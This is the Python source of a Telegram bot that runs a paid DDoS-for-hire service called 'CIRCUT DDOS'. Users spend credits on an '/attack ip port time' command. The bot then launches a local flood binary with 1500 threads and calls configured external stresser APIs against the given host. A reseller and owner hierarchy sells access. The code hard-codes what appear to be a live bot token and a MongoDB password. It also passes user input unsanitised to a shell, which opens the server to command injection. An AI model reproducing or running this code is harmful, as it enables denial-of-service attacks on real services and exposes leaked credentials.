import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500  # Aapki ID
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    api_collection = db.apis 
    admins_collection = db.admins 
    settings_collection = db.settings 
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# Global Variables
active_attacks = [] 
attack_lock = Lock()
DEFAULT_THREADS = 1500 

# --- PERMISSION HELPERS ---
def get_user_role(user_id):
    if user_id == PRIMARY_ADMIN:
        return "owner"
    admin_data = admins_collection.find_one({"user_id": user_id})
    return admin_data.get("role") if admin_data else "user"

def is_owner(user_id):
    return get_user_role(user_id) == "owner"

def is_reseller(user_id):
    role = get_user_role(user_id)
    return role == "reseller" or role == "owner"

# --- KEYBOARD ---
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

# --- SETTINGS LOADER ---
def get_settings():
    settings = settings_collection.find_one({"id": "bot_settings"})
    if not settings:
        default = {"id": "bot_settings", "max_time": 300, "total_slots": 1}
        settings_collection.insert_one(default)
        return default
    return settings

# --- CORE COMMANDS ---

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    if user_id == PRIMARY_ADMIN:
        admins_collection.update_one({"user_id": user_id}, {"$set": {"role": "owner"}}, upsert=True)
    
    bot.send_message(
        message.chat.id, 
        "🌍 *CIRCUT DDOS IS ONLINE!*\n\n*Status:* `Ready`\n*Role:* `{}`".format(get_user_role(user_id).upper()), 
        reply_markup=create_inline_keyboard(), 
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['help'])
def help_cmd(message):
    user_id = message.from_user.id
    role = get_user_role(user_id)
    
    help_text = "🌟 *COMMAND CENTER* 🌟\n\n"
    help_text += "*👤 User:* `/attack`, `/myinfo`, `/status`\n"
    
    if is_reseller(user_id):
        help_text += "*🤝 Reseller:* `/addcredits`, `/listapi`\n"
        
    if is_owner(user_id):
        help_text += "*👑 Owner:* `/addowner`, `/addreseller`, `/apiurl`, `/maxtime`, `/addslot`"

    bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

# --- ADMIN & MANAGEMENT COMMANDS ---

@bot.message_handler(commands=['addowner', 'addreseller', 'apiurl', 'maxtime', 'addslot', 'addcredits', 'listapi', 'delapi'])
def admin_handler(message):
    user_id = message.from_user.id
    role = get_user_role(user_id)
    cmd = message.text.split()[0].replace("/", "")
    args = message.text.split()

    # Permission Check
    if cmd in ['addowner', 'addreseller', 'apiurl', 'maxtime', 'addslot', 'delapi'] and role != "owner":
        bot.send_message(message.chat.id, "❌ *Owner permission required!*", parse_mode='Markdown')
        return
    if cmd in ['addcredits', 'listapi'] and role not in ["owner", "reseller"]:
        bot.send_message(message.chat.id, "❌ *Reseller permission required!*", parse_mode='Markdown')
        return

    try:
        if cmd == 'addowner':
            target = int(args[1])
            admins_collection.update_one({"user_id": target}, {"$set": {"role": "owner"}}, upsert=True)
            bot.send_message(message.chat.id, f"👑 *New Owner:* `{target}`")
        
        elif cmd == 'addreseller':
            target = int(args[1])
            admins_collection.update_one({"user_id": target}, {"$set": {"role": "reseller"}}, upsert=True)
            bot.send_message(message.chat.id, f"🤝 *New Reseller:* `{target}`")

        elif cmd == 'apiurl':
            if len(args) < 3:
                bot.send_message(message.chat.id, "❗ `/apiurl URL KEY`")
                return
            api_collection.update_one({"url": args[1]}, {"$set": {"key": args[2]}}, upsert=True)
            bot.send_message(message.chat.id, "✅ *API Configured Successfully.*")

        elif cmd == 'addcredits':
            target, amt = int(args[1]), int(args[2])
            users_collection.update_one({"user_id": target}, {"$inc": {"credits": amt}}, upsert=True)
            bot.send_message(message.chat.id, f"✅ Added `{amt}` credits to `{target}`")

        elif cmd == 'maxtime':
            t = int(args[1])
            settings_collection.update_one({"id": "bot_settings"}, {"$set": {"max_time": t}})
            bot.send_message(message.chat.id, f"✅ Max time set to: `{t}s`")

        elif cmd == 'addslot':
            s = int(args[1])
            settings_collection.update_one({"id": "bot_settings"}, {"$set": {"total_slots": s}})
            bot.send_message(message.chat.id, f"✅ Total slots set to: `{s}`")

        elif cmd == 'listapi':
            apis = list(api_collection.find())
            res = "📋 *Active APIs:*\n" + "\n".join([f"- `{a['url']}`" for a in apis]) if apis else "No APIs."
            bot.send_message(message.chat.id, res, parse_mode='Markdown')
            
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ *Error:* `{str(e)}`", parse_mode='Markdown')

# --- USER UTILITIES ---

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    role = get_user_role(user_id)
    credits = user_data.get('credits', 0) if user_data else 0
    bot.send_message(message.chat.id, f"👤 *ID:* `{user_id}`\n🎭 *Role:* `{role.upper()}`\n💳 *Credits:* `{credits}`", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['status'])
def status_cmd(message):
    settings = get_settings()
    used = len(active_attacks)
    bot.send_message(message.chat.id, f"📊 *Status:* {'Busy' if used >= settings['total_slots'] else 'Ready'}\n🚀 *Slots:* `{used}/{settings['total_slots']}`\n⏱️ *Max Time:* `{settings['max_time']}s`", parse_mode='Markdown')

# --- ATTACK ENGINE ---

async def run_attack_task(chat_id, ip, port, dur, atk_id):
    global active_attacks
    cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {ip} {port} {dur} {DEFAULT_THREADS}"
    
    # API Calls
    for api in list(api_collection.find()):
        try: requests.get(f"https://{api['url']}/api?key={api['key']}&host={ip}&port={port}&time={dur}", timeout=4)
        except: pass

    try:
        p = subprocess.Popen(cmd, shell=True)
        await asyncio.sleep(dur)
        p.terminate()
    finally:
        with attack_lock:
            if atk_id in active_attacks: active_attacks.remove(atk_id)
        bot.send_message(chat_id, "✅ *Attack Finished!*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    setts = get_settings()

    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Need 5 credits!*", reply_markup=create_inline_keyboard())
        return

    with attack_lock:
        if len(active_attacks) >= setts['total_slots']:
            bot.send_message(message.chat.id, "⚠️ *All Slots Full!*", reply_markup=create_inline_keyboard())
            return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "❌ *Usage:* `/attack ip port time`", parse_mode='Markdown')
        return

    try:
        ip, port, dur = args[1], int(args[2]), int(args[3])
        if dur > setts['max_time']:
            bot.send_message(message.chat.id, f"❌ *Max time is {setts['max_time']}s!*")
            return

        users_collection.update_one({"user_id": user_id}, {"$inc": {"credits": -5}})
        atk_id = f"{ip}_{port}_{time.time()}"
        with attack_lock: active_attacks.append(atk_id)

        bot.send_message(message.chat.id, f"🚀 *Launched!* (-5 Credits)\n🎯 `{ip}:{port}`", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        asyncio.run_coroutine_threadsafe(run_attack_task(message.chat.id, ip, port, dur, atk_id), attack_loop)
    except: pass

# --- MAIN RUNNER ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()

